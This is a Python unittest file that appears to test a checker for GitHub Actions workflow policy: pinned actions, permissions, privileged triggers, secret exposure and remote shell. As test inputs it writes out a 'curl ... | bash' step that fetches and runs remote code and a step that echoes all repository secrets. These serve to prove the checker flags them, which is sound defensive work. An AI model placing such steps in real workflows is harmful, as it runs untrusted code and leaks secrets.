"""Regression tests for the dependency-free Actions policy."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from check_actions_policy import audit

PIN = "actions/checkout@" + "a" * 40
BASE = "name: Example\non: [push]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: " + PIN + "\n"

class WorkflowPolicyTests(unittest.TestCase):
    def check(self, source, expected):
        self.assertTrue(any(expected in x for x in audit(source, "test.yml")))

    def test_good(self):
        self.assertEqual([], audit(BASE, "test.yml"))

    def test_unpinned(self):
        self.check(BASE.replace(PIN, "actions/checkout@v4"), "unpinned")

    def test_missing_permissions(self):
        self.check(BASE.replace("permissions:\n  contents: read\n", ""), "permissions")

    def test_privileged_trigger(self):
        self.check(BASE + "pull_request_target:\n", "privileged trigger")

    def test_secret_dump(self):
        self.check(BASE + "      - run: echo ${{ toJSON(secrets) }}\n", "secret serialization")

    def test_pr_secret(self):
        self.check(BASE + "pull_request:\n  branches: [main]\nenv:\n  KEY: ${{ secrets.API_KEY }}\n", "repository secrets")

    def test_remote_shell(self):
        self.check(BASE + "      - run: curl https://example.invalid/a | bash\n", "remote shell")

    def test_local_action(self):
        self.assertEqual([], audit(BASE.replace(PIN, "./.github/actions/test"), "test.yml"))

if __name__ == "__main__":
    unittest.main()
